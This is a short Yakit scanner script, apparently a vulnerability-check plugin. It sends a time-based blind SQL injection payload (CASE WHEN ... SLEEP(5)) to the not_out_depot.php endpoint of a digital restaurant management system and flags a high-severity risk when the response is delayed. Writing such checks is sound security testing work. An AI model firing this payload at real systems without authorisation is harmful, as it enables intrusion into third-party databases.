yakit.AutoInitYakit()
loglevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    packet = `GET /logistics/home_warning/php/not_out_depot.php?do=getList&lsid=(CASE WHEN (2945=2945) THEN SLEEP(5) ELSE 2945 END) HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close

`

    begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(5),
    )
    resp_time=time.Since(begin_time)
    //dump(rsp)
    if int(resp_time) > 5000000000{
        risk.NewRisk(
            target, risk.severity("high"),
            risk.title(f"喰星云·数字化餐饮服务系统not_out_depot SQL注入漏洞"),
            risk.titleVerbose("喰星云·数字化餐饮服务系统not_out_depot SQL注入漏洞"),
            risk.request(req),
            risk.response(rsp),
            risk.cve("no cve"),
            risk.details({
                "packet":string(packet),
            }),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
